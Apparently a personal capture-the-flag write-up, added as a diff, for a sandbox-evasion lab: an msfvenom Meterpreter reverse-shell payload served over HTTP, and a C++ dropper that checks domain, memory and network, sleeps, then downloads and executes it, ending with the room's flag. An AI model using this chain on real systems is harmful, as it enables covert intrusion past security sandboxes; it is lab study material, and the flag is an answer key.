@@ -16,3 +16,57 @@ Mail Sandboxes analyze attachments attached to emails
 
 Geolocation Filtering - reaching out to a host to identify your IP address
 Sleeping - burning compute-time to escape sandbox
+
+The Great Escape
+
+-check if device is joined to an AD Domain
+
+-check if system memory is greater than 1GB of RAM
+
+-Implement an outbound HTTP request to 10.10.10.10
+
+-Implement a 60s sleep timer before payload is retrived from your web server
+
+Steps: 
+
+1.Attacker Machine
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[Port] -f raw -o index.raw //generate payload
+ls -la index.raw //get size
+python3 -m http.server 8080 //host
+
+
+2. Victim Machine
+check in the materials folder open dropper.cpp - edit in notepad
+
+add all includes and libraries
+add functions
+a. BOOL isDomainController()
+  -change to dcNewName.find("\\\\")
+b. BOOL memoryCheck()
+  -change from 5.00 to 1.00
+c. BOOL checkIP()
+  -change website url to "http://10.10.10.10"
+d. int downloadAndExecute()
+  -change size to size of payload
+  -update the c2Url to "http://[yourIP]:8080/index.raw
+e. int main()
+  Sleep(60000);
+	if(isDomainController() == TRUE){
+		if(memoryCheck() == TRUE){
+			if(checkIP() ==TRUE){
+				downloadAndExecute();
+			}
+		}
+	}
+    return 0;
+
+3. open a new VS, stat a new project, resource files add dropper.cpp
+-build solution
+-get output C:\Users\Administrator\source\repos\Project1\x64\Debug\[your project].exe
+
+4. open cmd
+C:\Users\Administrator\Desktop\Materials> .\SandboxChecker.exe C:\Users\Administrator\source\repos\Project1\x64\Debug\[your project].exe
+
+5. grab flag
+THM{6c1f95ec}
+
